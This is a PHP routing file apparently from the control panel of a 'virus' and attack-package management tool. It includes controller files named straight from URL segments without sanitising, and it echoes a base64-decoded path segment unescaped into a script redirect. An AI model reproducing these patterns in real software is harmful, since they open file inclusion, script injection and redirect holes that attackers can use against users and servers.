<?php /** @noinspection PhpIncludeInspection */

use Kelvinho\Virus\Singleton\Header;

global $router, $requestData, $authenticator, $session, $userFactory, $virusFactory, $attackFactory, $timezone;

$router->getPostMulti(["controller/*", "ctrls/*"], fn() => $requestData->rightHost() ? include(__DIR__ . "/../controller/" . $requestData->getExplodedPath()[1] . ".php") : Header::notFound());
// added redirection on the 2nd exploded path
$router->get("controller/*/*", function () use ($requestData, $authenticator, $session, $userFactory, $virusFactory, $attackFactory, $timezone) {
    if (!$requestData->rightHost()) Header::notFound();
    include(__DIR__ . "/../controller/" . $requestData->getExplodedPath()[1] . ".php"); ?>
    <script>window.location = "<?php echo base64_decode($requestData->getExplodedPath()[2]); ?>";</script><?php
});
// custom controllers that attack packages may need
$router->getPost("vrs/*/aks/*/ctrls/*", function () use ($requestData, $attackFactory, $authenticator) {
    if (!$authenticator->authorized($virus_id = $requestData->getExplodedPath()[1], $attack_id = $requestData->getExplodedPath()[3])) Header::forbidden();
    $attackFactory->get($attack_id)->includeController($requestData->getExplodedPath()[5]);
});
